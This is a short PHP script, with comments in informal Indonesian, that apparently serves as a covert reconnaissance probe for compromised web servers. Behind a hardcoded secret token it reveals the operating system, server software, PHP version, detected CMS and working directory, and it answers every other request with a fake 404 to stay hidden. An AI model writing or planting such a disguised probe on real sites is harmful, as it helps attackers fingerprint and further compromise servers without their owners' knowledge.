<?php
// === CONFIG ===
$secret_token = "gacor123"; // Ganti token rahasia lu di sini

// === SYSTEM INFO FUNCTION ===
function system_info() {
    return [
        'OS' => php_uname(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'PHP Version' => PHP_VERSION,
    ];
}

// === CMS DETECTOR FUNCTION ===
function detect_cms() {
    $cms = 'Unknown';
    $paths = [
        'wp-config.php' => 'WordPress',
        'administrator/' => 'Joomla',
        'sites/' => 'Drupal',
        'core/' => 'Drupal',
        'composer.json' => 'Laravel / Symfony',
        'config.php' => 'Custom PHP / CodeIgniter',
        'system/' => 'CodeIgniter',
    ];
    foreach ($paths as $path => $name) {
        if (file_exists($path) || is_dir($path)) {
            $cms = $name;
            break;
        }
    }
    return $cms;
}

// === SAFE OUTPUT ===
if (isset($_GET['token']) && $_GET['token'] === $secret_token) {
    header('Content-Type: text/plain');
    echo "=== SERVER INFO ===\n";
    foreach (system_info() as $key => $value) {
        echo "$key: $value\n";
    }
    echo "\n=== CMS DETECTION ===\n";
    echo "Detected CMS: " . detect_cms() . "\n";

    echo "\n=== PATH INFO ===\n";
    echo "Current Path: " . getcwd() . "\n";
} else {
    http_response_code(404);
    exit;
}
?>
